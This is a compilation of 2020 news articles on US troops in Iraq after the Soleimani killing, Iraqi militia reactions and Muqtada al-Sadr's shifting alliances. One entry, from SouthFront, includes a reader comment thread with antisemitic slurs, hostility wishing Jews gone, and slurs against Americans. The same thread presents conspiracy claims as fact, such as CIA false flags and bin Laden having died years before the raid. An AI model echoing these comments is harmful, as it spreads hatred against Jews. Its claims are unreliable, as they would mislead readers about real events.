but the arrangement is set to expire in February. Iraq is also home to large Sunni and Kurdish populations, which oppose the idea of a US withdrawal and see US forces as a shield against unchecked power of Shiite factions. dj/msh (AP, Reuters, AFP) Every evening, DW sends out a selection of the day's news and features.

1,"Washington, DC – On Thursday night in a telephone call, Iraqi Prime Minister Adel Abdul-Mahdi told Secretary of State Mike Pompeo to start working out a road map for a US troop withdrawal from Iraq. Abdul-Mahdi showed his insistence following the vote of the Iraqi Parliament on Sunday, January 5, which directed the removal of the US military’s presence in Iraq. According to the statement about the call, “The prime minister said American forces had entered Iraq and drones are flying in its airspace without permission from Iraqi authorities, and this was a violation of the bilateral agreements.” The Prime Minister asked Pompeo to “send delegates to Iraq to prepare a mechanism to carry out the parliament’s resolution regarding the withdrawal of foreign troops from Iraq,” according to the statement. Iraq’s sovereign elected government voted 170-0 to remove US troops. And the US rogue regime is refusing to listen. This is a criminal military occupation of a sovereign foreign nation. The US claims it’s “a force for good,” but the people in the actual region say the OPPOSITE pic.twitter.com/RBdblZntEA — Ben Norton (@BenjaminNorton) January 10, 2020  The United States rejected the troop withdrawal request made by the Iraqi government: “On Friday, the U.S. State Department flatly dismissed the request. It said the presence of U.S. troops was crucial for the fight against the Islamic State group and it would not discuss removing them. “Any delegation sent to Iraq would be dedicated to discussing how to best recommit to our strategic partnership — not to discuss troop withdrawal, but our right, appropriate force posture in the Middle East,” said spokesperson Morgan Ortagus.” In response to the vote by Parliament on US troop withdrawal, top US military officials including Gen. Mark Milley, chairman of the Joint Chiefs of Staff, and Defense Secretary Mark Esper, said there were no plans for the US to withdraw. The State Department, following through on President Trump’s statement that NATO play a larger role in Iraq, said on Friday: “Today, a NATO delegation is at the State Department to discuss increasing NATO’s role in Iraq, in line with the president’s desire for burden sharing in all of our collective defense efforts.” There are currently 5,200 US troops in Iraq and President Trump has deployed 4,000 more troops to Iraq. In addition to escalating rather than removing troops, the US is making economic threats saying there needs “to be a conversation between the US and Iraqi governments not just regarding security, but about our financial, economic, and diplomatic partnership.” The US has granted a waiver to Iraq that allows the country to continue importing Iranian gas to meet electricity demands, which expires in February. The US has used this waiver as leverage against Iraq in the past. After the Parliament voted on Sunday, Trump said: “If they do ask us to leave, if we don’t do it in a very friendly basis, we will charge them sanctions like they’ve never seen before ever. It’ll make Iranian sanctions look somewhat tame. We have a very extraordinarily expensive airbase that’s there. It cost billions of dollars to build. Long before my time. We’re not leaving unless they pay us back for it.” Iraq has become a battleground between the US and Iran. The people of Iraq do not want their nation to be where the US and Iran fight their conflict. AP reports that protesters “lambasted the ongoing diplomatic crisis between Iraq, the U.S., and Iran in mass protests across the capital and southern provinces.” In Baghdad’s Tahrir square, thousands of protesters showed their anger and many chanted “Damn Iran and America!” Large demonstrations were also held in southern provinces of Basra, Dhi Qar, Najaf, and Diwanieh. According to Reuters, Grand Ayatollah Ali al-Sistani, Iraq’s top Shi’ite Muslim cleric, said it was Iraqis who stood to suffer most from the US-Iranian conflict. He condemned the US-Iranian confrontation taking place on Iraqi soil, saying it risked plunging an already war-ravaged country and the wider Middle East into deeper conflict. He described the latest actions as “repeated violations of Iraqi sovereignty. . . Iraq must govern itself and there must be no role for outsiders in its decision-making.” Another cleric warned during Friday prayers in Tehran that the United States’ bases in the region now created risks. Mohammad Javad Haj Aliakbari, a mid-ranking cleric, told worshippers “From now on, having too many bases, especially in this region, will not act as an advantage for them.” Iran wants the US out of the Middle East. Iran’s Supreme Leader, Ayatollah Ali Khamenei and President Hassan Rouhani also vowed to eject the US from the region in response to Suleimani’s death. A senior aide to Ayatollah Khamenei, Ali Akbar Velayati, warned US forces are risking a drawn-out, bloody and unsuccessful stay in the Middle East and “they must leave the region,” further, according to the state-affiliated Fars news agency. “If they do not leave the region, they will face another Vietnam.” After 17 years of chaos and destruction of multiple countries, the US may find that a rapid withdrawal will serve US interests better than a slow, bloody defeat forcing them out of the region. President Trump left an opening for leaving the region when he said: “We are independent, and we do not need Middle East oil and gas.” This could become an excuse for the US to leave the region. The United States is unwelcome in Iraq after the assassination of General Qassem Suleimani. If the US remains, it will become an occupying force. Suleimani developed an Arc of Resistance across the Middle East. Members of that Resistance may also take retribution independently of Iran. The US presents many targets in the region to its opponents. Leaving the region is the best option for the US and the countries and people of the Middle East.

1,"Iran-backed Shia armed groups call on President Salih to step down for ‘disrespecting’ Iraqi sovereignty and blood. Baghdad, Iraq – Leaders of several Iraqi Shia armed groups have condemned President Barham Salih’s meeting with his United States counterpart President Donald Trump, with some threatening to force Salih to resign. The meeting between the two presidents took place on the sidelines of the World Economic Forum in Davos, Switzerland on Wednesday. It came amid rising regional tensions that spilled over in Iraq after the killing of the leader of Iran‘s Quds Force, General Qassem Soleimani, and the simultaneous assassination of Abu Mahdi al-Muhandis, the deputy leader of the Hashd al-Shaabi (Popular Mobilisation Forces or PMF) in an airstrike ordered by Trump near Baghdad airport earlier this month. Al-Muhandis was also the founder of Kataib Hezbollah, an Iran-backed armed group that the US targeted in Iraq and Syria on December 30, killing at least 25 fighters and injuring more than 50. The attack was in response to the killing of a US civilian contractor two days earlier. Sadr calls for ‘million-man march’ against US presence in Iraq Iraqi parliament calls for expulsion of foreign troops Iraq protests swell with people angry at slow pace of reform Supporters and members of Kataib Hezbollah and other paramilitary groups within the PMF, an umbrella organisation of mostly Iran-backed Shia armed groups, responded by storming the US embassy in Baghdad. Mohammad Mohie, a spokesperson for Kataib Hezbollah, told Al Jazeera that the group considered the Salih-Trump meeting “deeply humiliating and inconsiderate of the loss of Iraqi blood”. “Trump has committed unforgivable crimes against the Iraqi people. How could Salih join hands with someone who has no respect for Iraq’s sovereignty and the blood of its martyrs?” Mohie asked. “He [Salih] has positioned himself against the Iraqi people. We call on him to step down and not return to Baghdad. He is no longer welcome among us.” Echoing those sentiments, Nasser al-Shammari, deputy secretary-general of the al-Naujabaa Brigades, another Shia armed group in Iraq, told Al Jazeera: “The hands of this man [Trump] are covered in Iraqi blood. “Most Iraqi people consider this [meeting] treacherous. We no longer accept him [Salih] as our representative and won’t rest until he’s held accountable for going against the will of the Iraqi parliament and disregarding our martyrs’ blood. “He must step down and be banished from Baghdad,” al-Shammari added. Following the meeting, Naeem al-Aboudi, a member of the Sadiqoon parliamentary bloc, the political arm of the Iran-backed Asaib Ahl al-Haq armed group, wrote on Twitter: “A statesman should not violate his country’s constitution and sovereignty, or be a reason to infuriate millions of his people.” The PMF, which was legally integrated into Iraq’s state security forces last year, did not issue a formal statement on the meeting. Its media representative, Mohannad Hussein, told Al Jazeera: “We are part of the Iraqi government. It is within diplomatic protocols for heads of state to meet.” Critics say some of the armed groups within the umbrella organisation operate independently of Baghdad. Ahead of the meeting, Kataib Hezbollah had warned that Salih would be “violating the will of the people” if he met Trump. In a statement ahead of the event, the Shia paramilitary group al-Nujabaa said it hoped Salih “rejects meeting this fool”. In his address in Davos, Salih said: “Iraq is indebted to the US-led coalition for its military and economic support which [it] continues to provide in the fight against ISIL. “The US-led military coalition was essential in allowing Iraqi forces to defeat ISIL. “The Iraqi parliament’s vote to expel US troops was not a sign of enmity. It was just a reaction to what many Iraqis saw as a violation to their country’s sovereignty, an issue that will be addressed through dialogue.” A statement from the Iraqi presidency said that the two heads of state discussed “reducing foreign troops in the country and the importance of respecting the demands of Iraqi people to preserve the country’s sovereignty”. In a joint news conference with Salih, Trump said the US and Iraq had “a very good relationship” and said the number of US troops in the country was “historically low”. Trump also met the president of Iraq’s semi-autonomous Kurdish region, Nechirvan Barzani, at the Swiss resort. While Iraq’s populist Shia cleric Muqtada al-Sadr did not issue a statement about the meeting, the move has amplified support for his calls for a “million-man march” against US troops in the country. The leader of the Asaib Ahl al-Haq, Qais al-Khazali, issued a video statement condemning the meeting and called on Iraqis to join the march scheduled for Friday morning in Baghdad. The leader of the Iran-backed group warned that the US will have to face the consequences if it “continues to disregard Iraq’s political and public will to expel US troops”. Reiterating a similar message, Shammari told Al Jazeera: “We expect an unprecedented number of people to take part on Friday. It will reignite the flame of resistance which won’t die until we expel every single one of them [US troops] from Iraq. “This is the will of the Iraqi people and the parliament,” he added. Sadr’s calls for the march came just days after the country’s parliament voted to expel foreign troops and cancel its request for assistance from the US-led coalition that had been working with Baghdad to fight ISIL. Around 5,000 US troops are left in Iraq – most of them soldiers who came to Iraq in an advisory capacity to help the PMF from 2014 to 2017 in their fight against ISIL. The parliament vote earlier this month provoked Trump to threaten “sanctions like they’ve never seen before” on Iraq. Abdullah al-Salam reported from Baghdad. Arwa Ibrahim reported from Doha.

1,"Iraqi leaders have called for the removal of US troops from the country following the drone attack that killed Iranian military leader Qassem Soleimani and Iraqi military commander Abu Mahdi al-Muhandis. Parliament voted to remove the US troops, however the ruling is not valid unless signed by the prime minister. Iraq's caretaker prime minister Abdul Mahdi is not legally authorized to sign the bill into law, according to The Washington Post. Abdul-Mahdi resigned last year in response to the anti-government protests and political parties have been unable to agree on a new prime minister, and Abdul-Mahdi remains in a caretaker capacity. US Secretary of State Mike Pompeo was asked shortly before the parliamentary vote whether the US would comply with the request for American troops to leave. ""We'll watch. We're following very closely what's taking place in the Iraqi Parliament,"" Pompeo told ""Face the Nation."" ""It is the United States that is prepared to help the Iraqi people get what it is they deserve and continue our mission there to take down terrorism from ISIS and others in the region."" .@DrSJaishankar and I spoke just now regarding Iran’s continued threats and provocations. The Trump Administration won’t hesitate to act to keep American lives, and those of our friends and allies, safe. — Secretary Pompeo (@SecPompeo) January 5, 2020 Around 5,000 American troops are based in Iraq, where they mainly train Iraqi forces and help to combat the Islamic State. Hezbollah leader Hassan Nasrallah vowed to end the US military's presence in the Middle East, saying U.S. bases, warships and soldiers are now fair targets. ""The suicide attackers who forced the Americans to leave from our region in the past are still here and their numbers have increased,"" Nasrallah said. Also, a former leader of Iran's Revolutionary Guard suggests that the Israeli city of Haifa and ""centers"" like Tel Aviv could be targeted following the death of Soleimani in the US strike. Soleimani's death is being called a ""significant blow"" to Iran. The US knew that Soleimani was behind the recent attack on the US embassy in Baghdad and Defense Secretary Mark Esper had issued a warning saying on MSNBC, ""Enough is enough. We have all the capabilities to either respond to further attacks or take preemptive action if additional attacks are being prepared."" ""What happened was a political assassination. Iraq cannot accept this,"" Abdul-Mahdi said during an address to the parliament. US officials have made it clear they are prepared to meet any response from Iran. Did you know?

1,"A new sign greets travelers leaving the Baghdad International Airport, with white-on-red Arabic letters on a shrapnel-pockmarked wall. It proclaims the spot is the “the site of the American crime,” where on January 3rd, a U.S. drone strike killed Iranian general Qasem Soleimani and Abu Mahdi al-Muhandis, deputy leader of Iraq’s government-sanctioned armed groups and a legendary anti-ISIS commander among the country’s majority Shi’ite community. Another sign of the anti-U.S. sentiment in Iraq: the quarter- to half-a-million Iraqis who peacefully took to the streets of Baghdad on Friday to protest the killing and demand all American troops leave the country. The gathering was a disciplined but undeniable display of the growing resentment of the U.S. military mission that had been welcomed in 2014 to fight ISIS, and a clear signal of how the rising political fortunes of pro-Iranian Iraqi politicians like march organizer Shi’ite cleric Muqtada al-Sadr could hasten the departure of U.S. troops. “Sadr was on good behavior today because he wants now to be known as pragmatic politician instead of Molotov-cocktail-throwing politician,” one senior U.S. official said of the march, speaking anonymously to describe the precarious security situation of U.S. diplomats in Iraq. The U.S. Embassy in Baghdad was attacked on New Year’s Eve by Iraqi militiamen who surrounded and breached the compound’s gates over a 24-hour period before Iraqi security forces finally intervened. Two Iraqi officials estimated Sadr’s Friday crowd reached 500,000, but the senior U.S. official put it at “two-hundred thousand marchers, not the million he’d called for.” Nevertheless, the U.S. official added, “He’s still a force to be reckoned with.” Sadr, a longtime political enemy of the U.S. whose armed militia used to target American forces during the U.S. occupation of the country, ordered his followers on Friday not to enter the security zone housing the embassy, and they listened. It’s part of a policy of non-violent resistance agreed upon by Sadr and other top Iraqi militia leaders in the wake of Soleimani’s death. The leaders met in Qom, Iran, roughly two weeks ago, according to a senior Iraqi official, choosing to convene outside Iraq partly out of fear that they too might be targeted or at the very least, surveilled, after the Soleimani-Muhandis killing. “Sadr protected Iraq from Iran-U.S. rivalries, and called for diplomatic means, not violence, for ‘evicting’ the U.S. troops,” says Dlawer Ala’Aldeen, president of the Erbil-based Middle East Research Institute. Sadr also “protected the U.S. presence indirectly,” by focusing Iraqi popular rage into a nonviolent protest, derailing other militia group’s calls for blood. The march shows the rising power of the pro-Iranian blocks in Iraq despite months of violent popular protests directed against Iran and the parties allied with it that led to the resignation of Iraq’s now-caretaker Prime Minister Adel al-Mahdi. “This gave them a boost politically to the pressure him… to follow through with kicking U.S. troops out,” the senior Iraqi official told TIME. The hobbled Iraqi leader has been grappling with how to enact a parliament vote demanding the exit of U.S. troops after the U.S. attack, whose ouster al-Mahdi has publicly embraced even as he has privately slow-rolled the action. He fears a total American pullout will prompt the departure of Western troops who have been training Iraqi security forces as part of the anti-ISIS coalition, and drain the country of international investment. Those concerns have done little to shift opinions on the street — or the demands of politicians like Sadr whose political fortunes are allied with Iran and its long-term goal of removing U.S. troops from the region. For now, al-Mahdi, who largely derives his political power from the Iranian-aligned groups, has been able to delay immediate action, as he does a “risk assessment” on how the withdrawal would affect the ISIS fight. His hesitation has also been leavened by President Donald Trump’s threats to sanction Iraq and force it to pay for improvements the U.S. military made to an Iraqi air base if U.S. troops are expelled. “We are happy to continue the conversation with the Iraqis about what the right structure is,” Secretary of State Mike Pompeo said at a State Department news conference, after announcing U.S. troops would be staying put. On that front, the Americans and Iraqis may find some common ground. “The status quo is unacceptable, but a full withdrawal is unacceptable as well,” a senior Iraqi official involved in the discussions says. “We still have a common enemy called Daesh (ISIS) which we can’t just forget…but we need to redefine the U.S. role. Spying on Iran and assassinating generals won’t work,’” he said. Alternatives like NATO taking over the mission might appease public sentiment, he suggested, and restore the Iraqi government’s trust in American forces. It’s an idea that is apparently on the table in Washington. “We’re at an early stage in looking at what NATO can do to expand the mission it already has in Iraq,” Amb. James Jeffrey, U.S. Special Envoy to the Global Coalition to Defeat ISIS, told reporters Thursday. “We have said that we’re not interested in talking about withdrawal because we don’t think we should withdraw; however, at the end of the day, this is obviously an Iraqi decision.” “There’s a lot of people who want us to stay in Iraq as partners,” said Joey Hood, the former deputy of the U.S. Embassy in Baghdad, now the Principal Deputy Assistant Secretary of State for Near Eastern Affairs, in a Friday interview on Iraq’s news and satire program, the Albasheer Show. He defended killing Soleimani on Iraqi soil. “It was not a choice so much as a necessity. This guy…was not only planning attacks on Americans, he had actually started carrying them out,” referring to the 2019 rocket attack that killed an American contractor in Kirkuk and the Iranian proxy attack on the U.S. embassy. “We needed to take action as soon as we could and where we could…It’s unfortunate that these sorts of things have to happen. We don’t want Iraq to be a battleground for anyone.” Contact us at letters@time.com."

1,"Support SouthFront Click to see full-size image The influential Iraqi Shiite Cleric Muqtada al-Sadr escaped an alleged US assassination plot, according to the leader of Asa’ib Ahl al-Haq Resistance Movement Qais Khazali. “The first US-Israeli plot to be implemented in Iraq was assassination of Muqtada Sadr to put the blame on Asa’ib Ahl al-Haq and start internal bloodshed,” Khazali said in a TV program named Liqa al-Khas. According to him, both al-Sadr and Iran were informed of the plot and it failed. In May 2018, al-Sadr’s Sairoon electoral list won 54 seats in the first Iraqi parliamentary election since the ISIS was declared defeated in Iraq. He is the most influential political figure in the country. He rejected US interference in the formation of the new Iraqi government, saying that “the US is an invader country; we do not allow it to interfere” in Iraqi affairs. Just days earlier, on February 2nd, he called for an end to the violence on Iraq’s streets, as more than 550 protesters have died in the demonstrations since they began in October 2019. Muqtada al-Sadr said in a tweet that in accordance with the recommendations of the supreme religious authority of Iraq (Marja) and in accordance with divine and rational laws, the street protests must return to its peaceful status and discipline. But he called for protests to continue, since he supports the incoming Prime Minister Mohammad Allawi, who is known for his strongly pro-Hezbollah views. Al-Sadr has called on his supporters named the “Blue Hats” to work with security forces to maintain peaceful protests in Baghdad’s Tahrir Square. Sadr also emphasized the need to reopen schools in the southern and central provinces in collaboration with the tribes of those provinces and strongly opposed the violence and the closure of the streets under the pretext of street protests. Allawi, 65, is a veteran Iraqi politician who started his political career with the Iraqi Islamic Dawa Party before leaving the party. He was born in Baghdad, but he was forced to leave it in 1977, after being pursued by the Ba’ath government. Allawi is a cousin of the former Iraqi prime minister and secular politician Iyad Allawi, but he is also a relative of Sadr. Two of Allawi’s daughters are married to sons of Basil al-Sadr, Sadr’s cousin and director of foreign relations at the Sadr office in London. Allawi’s nomination “is a premeditated plan that started more than 40 days ago when the [Iranian-backed] political forces noticed that Sadr was convinced of Allawi’s nomination, so they sought to perpetuate and develop this conviction,” an unnamed Shiite leader from Iraq told Middle East Eye. “After the assassination of [Iranian General Qassem] Soleimani and [Abu Mahdi] al0-Muhandis, Iranian policy in Iraq has completely changed. Soleimani was working to exclude Muqtada and keep him away all the time, but now the situation has changed. “There is an Iranian tendency to contain Sadr and give him the role he desires. “The [armed] factions pledged allegiance to Sadr in Qom as leader of the resistance, and this was part of the implementation of this policy.” Initially al-Sadr supported the anti-government protests, but now that he supports the incoming Prime Minister, he maintains that peace should return to the streets and order should be reinstated. At the same time, he is a strong political figure, who, despite his view of a very independent Iraq is much more open to cooperate with regional actors such as Iran and Syria, rather than with the US, thus the claims of a possible assassination plot aren’t entirely out of the question. After all, al-Sadr strongly opposes any US presence, and the only option for Washington’s influence to grow is the remaining of its forces within the country. On the other hand, the US’ “nemesis” Iran has more interest in a strong and independent Iraq, which is open to constructive cooperation. MORE ON THE TOPIC: Support SouthFront SouthFront Sparse on the assassination attempt, but good background. Jew York Times even confirmed that the rocket attacks on Americunt occupation bases are false flags by CIA backed terrorists to blame the Iranians. All the US really succeeds in doing, is to unite political rivals who oppose the tyranny and plunder of the US. The Khazar 1% semites that control the US are making the same mistakes that they always have for centuries. When the Khazars ‘pluck the feathers ‘ of a country like Iraq, they take all the ‘feathers’ and the bald birds become hungry and angry. US diplomacy is so heinous that they only succeed in making their opponents look like reformers Its arguable that Diplomacy in the US was abandoned decades ago. Empires past and present have only issued Decrees, Demands and Denials, à la ‘Perfidious Albion’. CIA mystery: Did Iran kill ‘Ayatollah Mike?’ Nobody is talking after Michael D’Andrea, the CIA’s top Iran Mission Center chief, is allegedly killed in plane crash but eight new stars have appeared on the “wall of heroes” at the CIA headquarters at Langley. The White House and CIA have neither confirmed nor denied that it was, or if D’Andrea is alive or dead. Cue the media speculation. The former chief of the CIA’s Counter Terrorism Center, he was appointed to his current position by then Agency Director Mike Pompeo in 2017. The New York Times reported that his appearance would mean a much harder line in opposing Iran by the Trump administration, the report said 8 new stars on the wall of heroes!? sure as a klucking bell hope one pertains to this d’andrea guy (and just as much hope that it was in fact a close cooperation between Iran and the talibans that downed that bombardier -nothing could be sweeter) and the fact that the disunited states of morons is defeated in afghanistan is another thing to celebrate – all they’re doing now is to work out a honourable truce which the talibans won’t give them and then it’s the question how to get the stuff of tanks, guns etc back home now that most ways are closed for such transports. As I wrote a month ago the Americunts are trying to set off an internecine Shia conflict so that their savage occupation and oil plunder can continue. Now it has been proven by the western media that the rocked attack on the Balad airbase was conducted by CIA paid headchoppers to justify the assassination of General Soleimani. It will have the opposite effect though as all Shia and many patriotic Sunnis will unite and attack the Americunt occupation arseholes. The Americans are playing the fools again, trying to get everyone to believe it’s another well intentioned ‘mistake’. Thanks God, may the evil people behind these assassination plots meet their untimely ends not surprising since the disunited states of A is prone to resort to skulduggery when the influence it once wielded is disappearing down the drain – it’s the washington morons doing the dirty work of the illegal settlers on palestinian land and if an assassination or two is required so be it but rest assured that at the squatters or the jews will soon be a memory far removed from the hustle and bustle of everyday life, here, in the middle east and in the far east. and by golly, the hymies, the kikes, the jews, the squatters won’t be missed by the greater part of humanity – might say they overstayed their welcome! Donald Trump is talking peace, but itching for war. That is how he hopes to sell to Americans the coming war with Iran. He will tell them he didn’t want a war, but could not do otherwise. He campaigned on a promise to pull troops for the middle east. Instead, he increased the number of troops and war machine to a greater extend than Obama did. His promise of peace and negotiation was a deception – a deception that will lead to war. It is good that Iran has prepared for war. Trumps finger is itching to pull the trigger just as he hesitates over the possible consequences. At some point, he will pull the trigger or be pushed to do so. If we make it through 2020 without a war, the middle east will be very lucky. Iran has taken the responsibility to rid the region of American presence. It had better be ready as the Americans are coming for them. But I think Iran will do very well, and the possibility of purging America from the region is very likely. Only that it is hard to see the U.S leave without dropping nukes on Iran. I agree on the nuke thing and israel will be there too with nukes – but given that iran is a vast place with loads of people even the nukes won’t change the situation and Iran will indeed lay waste to oil facilities in saudi and the uae and kuwait and close the hormuz strait for shipments out of there. trump however will wait for his second term before running amok in the middle east and there are two reasons, the first is oil since the new found shale-bonanza back home is a short lived phenomenon and thus iraq’s oil and any oil in the me (and venezuela) will be required in the future and the second is israel and the lebensraum extension of the borders into iraq (all the way to the Iranian border or thereabouts), into syria, into lebanon. the one problem here is Iran which has some severe opposing thoughts on the matter and turkey which consider those areas as a prerogative of turkey and not something the jews ever shall hold or occupy. thus too much open hostilities by the disunited states of A surely will force a joining up of iran and turkey and then iraq and syria hezbollah and so on. and after that it’s anyone’s guess. The only people you should trust less than the Turks and the Israelis are the Americans. Rusty Iron Dick is upset as you said the Yanks are less trustworthy than Israeli’s. I tend to agree with him as I think Israelis learnt from the yanks and got better at it than them. Ha, I don’t know…… When the Israelis backstab you, you think they’re being clever, when the US backstabs you, you think they’re doing because they are dumb. I think the lie goes deeper with the Americans because they pretend more. Not hard The Islamic State (IS) group has was paid by the CIA to stage the false flag that was used as the justification for the asassination of Iranian general Qasem Soleimani, the head of the elite Quds Force. Iraq Is the One War Zone Trump Doesn’t Want to Leave The president’s resistance to withdrawing from the country boils down to oil and Iran. The assassination of General Soleimani is part of the cycle of staged events used as a justification for the continued occupation of Iraq and rapid exploitation of its natural resources. Yes. Bad move guys. If the Americans wanted to kill him, he would be dead already. There have been rumors in the past that Iran wants to kill him. It seems that he will die at the age of 120 after every person who spreads rumors about him is already dead. If the US wanted to kill him,,,.. yes a bit like the only way the US could kill Osama bin Laden was when he had already been dead for years. No wonder they never flew his non existant body onto the US ship , sailors on board said NO chopper ever landed on their ship that night. , and disposed of it where no one can ever check.. Sadr has been fighting the US for years and got soundly thrashed in Fallujah was it. He ended up working out a peace deal with the US to end the fighting as he was serriously out gunned and out manned. Over 80 US dead and 600 wounded with around 2000 of Sadrs men killed . You left out the bit where the Seal team that “killed” “Bin Laden” were conveniently killed in a helicopter crash in Afghanistan shortly after. Yes all the Seal team on board one chopper against rules taken out by the Taliban who were then heard skiting over the radio they had just taken out the group that killed Obama. How did they know who was on board the chopper they had just shot down or were they told it was coming. Also missed the story about the neighbors who watched the event unfold from their rooftop ovelooking “Osama’s” compound. They heard the people on the chopper shouting in their local dialect which no Seal member knew , and that NO chopper took off from the compound and that they KNEW the people in that compound..as per a Pakistani TV interview made just after the ” raid” but has since msyteriously disappeared . Nor did I say anything about Benazir Bhutto who told David Frost I think it was , in an interview that Osama was already dead. She was assasinated in Dec 2007. ( not because of her interview ) Osama bin Laden was ” killed ” in that raid May 2011. Scratch head many times. Been looking for that video of Frosts interview and HELLO …. everything has been censored or blocked or removed. If it was a LIE why would anyone censor it. Truth is all that is censored. I watched it years ago so I know it exists or rather existed. Further research and I have found , but any video is blocked or removed. On 2 November 2007 Benazir Bhutto was interviewed by Sir David Frost at Al Jazeera shortly before her murder on 27 December 2007. In this interview she said: “And he had also dealings with Omar Sheik, the man who murdered Osama Bin Laden.” The same interview was published on the BBC website, but that key sentence was removed. Here is the transcript of this key passage: “Frost: In terms of the three people you mentioned – were they members of or associated with the government? Bhutto: Yes well one of them is a very key figure in security, a former military officer. He’s someone who has had dealings with ?? Mohammed, one of the band groups and Mohammed Assar, who was in an Indian jail for decapitating three British tourists and three American tourists. And he had also dealings with Omar Sheik, the man who murdered Osama Bin Laden” (see “BBC censors interview with Benazir Bhutto: … “the man who murdered Osama bin Laden” (2 versions)”: http://video.google.com/videoplay?docid=3468310105875718252 ; also “BBC censors Bhutto Frost interview (Bin Laden murdered)”, YouTube, 31 December 2007: http://www.youtube.com/watch?v=DGAOH_E3aQQ .

The part where she talks of Osama already being dead four years before the US supposedly killed him starts at 5.40 as she talks of those behind attempting too assasinate her.https://www.aljazeera.com/programmes/frostovertheworld/2007/11/200852519441678437.html Within the Agency, D’Andrea was reportedly referred to as the Dark Prince or Ayatollah Mike, nicknames he acquired while heading the search for Osama bin Laden and also while directed drone strikes against al-Qaeda targets, the report said. A chain-smoking convert to Islam, he is not your conventional Agency officer, many of whom are more comfortable working from an embassy desk rather than a helicopter. A workaholic who keeps a roll away bed in his office, D’Andrea is, as a result of his abrasive style, reportedly extremely difficult to work with. Whether he is alive or dead, the tale of his so-called death serves as a warning from Iran. Even an obstinate White House can’t help but think that killing men like Soleimani might not be such a great idea — if we continue to do it to “them,” “they” will turn around and “do it to us. With what a drone strike but then we wouldn’t be able to pin the blame on a rival political faction and provoke a larger Shiite response. For this operation, we’d have to use either a bullet or car bomb and rely on a local operative. This has a very high incidence of failure depending on how good the security is for the target. If the Iraqi population wants freedom and democracy they cant do it without Americans. The Iraqis have been in infights internally between each other and always quarrel about who are boss and who should have our old boots. Therefore it take so long because the Iraqis don’t yet have the intelligence to freedom. When you break it, you own it. If you can dream it, you can do it. That’s why we are responsible and promise the Iraqi people that we will not leave Iraq before all Iraqis have freedom, and they can trust America will provide security to all Iraqis as long as we are in the country."

1,"Muqtada al-Sadr in Najaf, Iraq in October, 2019 (Credit: Getty Images) Prominent Iraqi Shi’a cleric Muqtada al-Sadr was pressured to disband his “Blue Hat” guard corps on Tuesday in one of the most stunning turn of events since the beginning of the lraqi protest movement last October. Previously deployed to shield demonstrators against draconian crackdowns led by Iranian-sponsored militias, the Blue Hats had recently turned against the same protesters they were originally commissioned to protect. The violence culminated last Wednesday evening, 6 February, when a contingent of Blue Hats attacked an encampment of demonstrators in the southern Iraqi city of Najaf, setting their tents ablaze and firing on them, killing 11. Condemnation against the brutality of Sadr’s militia swelled the ranks of protesters the following day across country, forcing the fiery cleric to publicly declare that he had dissolved the force less than a week later.

Learn more about how you can pray and partner with us in this worthy endeavor. The rise and fall of the Blue Hats is just the latest chapter in the strange and tragic saga of the Iraqi street protest movement. Led mostly by Shi’a youth in the nation’s south, the protests broke out spontaneously on October 1 of last year. Fueled by growing discontent with government corruption, lack of employment and basic services, demonstrators were openly critical of Iranian influence in Iraqi politics. Iran, also embroiled in a brutal crackdown against its own street protest movement at home, sent elements of their Revolutionary Guard Corps (IRGC) to advise the Iraqi government and the powerful Iraqi militias which it sponsors, such as Kataib Hezbollah and the Badr Brigades. The militias, which were originally organized in 2014 to counteract the expansion of ISIS, have since been integrated into the Iraqi army, with many Iranian-linked militia leaders holding powerful positions in the military hierarchy. Despite long-standing ties with Iranian clerics that predate the 2003 Iraq War, Muqtada al-Sadr initially styled himself as an Iraqi nationalist in support of the street protests, putting him at odds with his Iranian benefactors. He decried all foreign influences, including Iran, but especially the US-led Coalition. He hoped to ride the wave of grassroots anger and steer it against Western intervention in Iraq. However, the death of Iranian Quds Force commander Qassem Soleimani and Kataib Hezbollah leader Abu Mahdi al-Mandis on 3 January was a turning point for the Iraqi cleric. After the death of their master strategist and faced with a growing protest movement that would not be stamped out by violent tactics, the Iranians were forced to reconsider their strategy in Iraq. They began wooing al-Sadr back into their fold in mid-January. SERVE THE KURDS IN IRAQ Click on the graphic to learn more about our Pesengi immersion courses available this year. By the end of last month, al-Sadr had reconciled with the Iranian government and formed a parliamentary bloc with pro-Iranian Shi’a parties to appoint Mohammad Allawi as the new Iraqi prime minister. Allawi, who has close ties with Iran, was immediately rejected by the protest movement as a step backwards, putting the movement at odds with al-Sadr. Relations between the Sadrists and the demonstrators broke down quickly, with Sadr’s militiamen taking over the “Turkish Restaurant” in Baghdad’s Tahrir Square on 2 February, recognized as the hub of the protest movement. The massacre in Najaf came just a few days later. Despite his pivot back towards Iran, al-Sadr continues to thread the needle. His office demanded Tuesday that the newly-appointed prime minister form a government and present it to the Iraqi parliament by 2 March or “face hell.” Muqtada continues to speak out in public support of demonstrators who are still taking to the streets daily across Iraq, while at the same time he is facilitating a political agenda that runs contrary to their demands. But political hedging and opportunism are nothing new for al-Sadr, who has a long history of chameleon tactics that stretch back to the early years of the Iraq War. During those years, he acted the firebrand by opposing US presence in Iraq and facilitating deadly, Iranian-orchestrated attacks on US forces while also portraying himself as a statesman and a unifying figure in Iraqi society. Now, with Iraq more divided than ever, al-Sadr’s political clout in Baghdad is the strongest it has ever been.

1,"منوع (current) تقارير وبرامج (current) Orient Net 2020-02-12 08:26:00 Shortly after Iranian regime’s Major General Qassem Soleimani was killed in a US drone strike in Iraq, the Tehran-backed Lebanese organization Hezbollah urgently met with Iraqi militia leaders, seeking to unite them in the face of a huge void left by their powerful mentor’s death, two sources with knowledge of the meetings told Reuters. The meetings were meant to coordinate the political efforts of Iraq’s often-fractious militias, which lost not only Soleimani but also Abu Mahdi al-Muhandis, a unifying Iraqi paramilitary commander, in the Jan. 3 attack at Baghdad airport, the sources said. While offering few details, two additional sources in a pro-Iranian regime’s regional alliance confirmed that Hezbollah, which is sanctioned as a terrorist group by the United States, has stepped in to help fill the void left by Soleimani in guiding the militias. All sources in this article spoke on condition of anonymity to address sensitive political activities rarely addressed in public. Officials with the governments of Iraq and Iran did not respond to requests for comment, nor did a spokesperson for the militia groups. The discussions shed light on how Iran and its allied groups are trying to cement control in the unstable Middle East, especially in the wake of the devastating US attack on a revered Iranian military leader. The Tehran-backed militias are critical to Iran’s efforts to maintain control over Iraq, where the US still maintains some 5,000 troops. The country has experienced years of civil war since US forces toppled Saddam Hussein and more recently, the government - and the militias - have faced growing protests against Iran’s influence in the country. Iranian regime helped found some Iraqi militia groups. In the months ahead of his death, Soleimani had waded ever deeper into the Iraq crisis, holding meetings with the Iraqi militias in Baghdad as Tehran sought to defend its allies and interests in its power 